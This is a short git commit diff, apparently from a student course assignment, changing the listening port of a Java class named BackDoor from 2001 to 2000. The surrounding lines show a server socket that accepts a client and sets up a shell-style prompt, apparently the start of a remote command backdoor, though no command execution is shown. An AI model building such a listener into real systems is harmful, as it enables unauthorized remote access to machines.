37de2608d28ecd0a68e1c56fb0c6ecfcfca93d1a
Pedro Nunez <peter.nunez1029@gmail.com>
2023-05-01 16:14:59 -0700

    fixed a couple things

--- CSC123/CSC123-assignmnet7/BackDoor.java
+++ CSC123/CSC123-assignmnet7/BackDoor.java
@@ -15,7 +15,7 @@ public class BackDoor {
 		// TODO Auto-generated method stub
 
 		try {
-			ServerSocket server=new ServerSocket(2001);
+			ServerSocket server=new ServerSocket(2000);
 			Socket client=server.accept();
 			String workingDir=System.getProperty("user.dir");
 			String prompt=System.getProperty("os.name").toLowerCase().contains("mac os")?" % ":" :> ";
